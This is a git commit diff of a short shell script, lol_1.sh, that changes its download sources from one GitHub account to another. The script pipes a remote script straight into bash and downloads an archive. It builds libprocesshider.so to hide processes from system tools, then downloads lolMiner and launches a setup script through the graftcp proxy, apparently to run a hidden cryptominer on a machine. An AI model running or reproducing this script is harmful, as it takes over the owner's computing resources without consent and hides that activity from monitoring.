338c789652eb2709bee64f86a12c02e06852a727
Rajapolah <105721082+17mei2022@users.noreply.github.com>
2022-09-26 04:36:31 +0700

    Update lol_1.sh

--- lol_1.sh
+++ lol_1.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/KebonKalapa/ETC/main/px_1.sh | bash
-wget https://github.com/KebonKalapa/ETC/raw/main/magicLol.zip
+wget -O - https://raw.githubusercontent.com/17mei2022/sept22/main/px_1.sh | bash
+wget https://github.com/17mei2022/sept22/raw/main/magicLol.zip
 unzip magicLol.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
@@ -10,6 +10,6 @@ wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.37/lolM
 tar -xvzf lolMiner_v1.37.tar.gz
 rm .gitignore
 cd 1.37
-wget https://raw.githubusercontent.com/KebonKalapa/ETC/main/set_lol.sh
+wget https://raw.githubusercontent.com/17mei2022/sept22/main/set_lol.sh
 chmod +x *.sh
 graftcp ./set_lol.sh
